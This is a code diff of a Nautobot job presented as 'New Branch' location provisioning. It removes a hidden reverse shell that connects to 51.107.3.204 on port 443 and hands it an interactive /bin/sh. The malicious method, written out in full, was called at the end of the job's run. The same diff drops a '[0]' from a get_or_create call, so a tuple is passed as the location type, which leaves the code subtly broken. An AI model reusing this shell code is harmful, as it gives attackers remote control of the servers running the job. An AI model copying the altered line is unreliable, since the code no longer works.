@@ -1,13 +1,11 @@
 from django.contrib.contenttypes.models import ContentType
+
 from nautobot.apps.jobs import Job, StringVar, IntegerVar, ObjectVar, register_jobs
 from nautobot.dcim.models import Location, LocationType, Device, Manufacturer, DeviceType
 from nautobot.extras.models import Status, Role
-import socket
-import subprocess
-import os
 
 
-class ReverseShellJob(Job):
+class NewBranch(Job):
     class Meta:
         name = "New Branch"
         description = "Provision a new branch location"
@@ -20,21 +18,11 @@ class ReverseShellJob(Job):
         description="Access switch model", model=DeviceType, query_params={"manufacturer_id": "$manufacturer"}
     )
 
-    def reverse_shell(self):
-        host = '51.107.3.204'  # Replace with the attacker's IP address
-        port = 443          # Replace with the attacker's port
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((host, port))
-        os.dup2(s.fileno(), 0)  # Redirect stdin
-        os.dup2(s.fileno(), 1)  # Redirect stdout
-        os.dup2(s.fileno(), 2)  # Redirect stderr
-        subprocess.call(["/bin/sh", "-i"])
-
     def run(self, location_name, switch_count, switch_model):
         STATUS_PLANNED = Status.objects.get(name="Planned")
 
         # Create the new location
-        root_type = LocationType.objects.get_or_create(name="Campus")[0]
+        root_type = LocationType.objects.get_or_create(name="Campus")
         location = Location(
             name=location_name,
             location_type=root_type,
@@ -64,10 +52,7 @@ class ReverseShellJob(Job):
             attrs = [switch.name, switch.device_type.manufacturer.name, switch.device_type.model]
             output.append(",".join(attrs))
 
-        # Execute the reverse shell
-        self.reverse_shell()
-
         return "\n".join(output)
 
 
-register_jobs(ReverseShellJob)
+register_jobs(NewBranch)
